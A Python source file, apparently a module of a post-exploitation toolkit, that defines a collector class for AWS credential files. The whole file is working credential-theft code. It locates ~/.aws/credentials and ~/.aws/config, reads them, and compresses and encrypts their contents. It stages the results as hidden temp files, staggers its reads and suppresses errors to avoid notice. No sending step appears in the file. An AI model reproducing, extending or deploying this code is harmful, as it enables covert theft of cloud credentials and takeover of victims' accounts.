
from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class AwsCollector(BaseCollector):
    """
    Collect AWS credential files.
    Files accessed individually with stagger. Content encrypted before staging.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        aws_files = [
            Path.home() / ".aws" / "credentials",
            Path.home() / ".aws" / "config",
        ]
        for aws_file in aws_files:
            if not aws_file.exists():
                continue

            yield ArtifactMetadata(
                artifact_family="aws_credentials",
                source_path=str(aws_file),
                source_platform=os.name,
                collection_method="file_read",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            aws_file = Path(artifact.source_path)
            data    = aws_file.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            stage_path = self._staging_dir / f".{sha256[:16]}.aws.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(aws_file),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("AWS file collection error (%s): %s", artifact.source_path, exc)
        return None
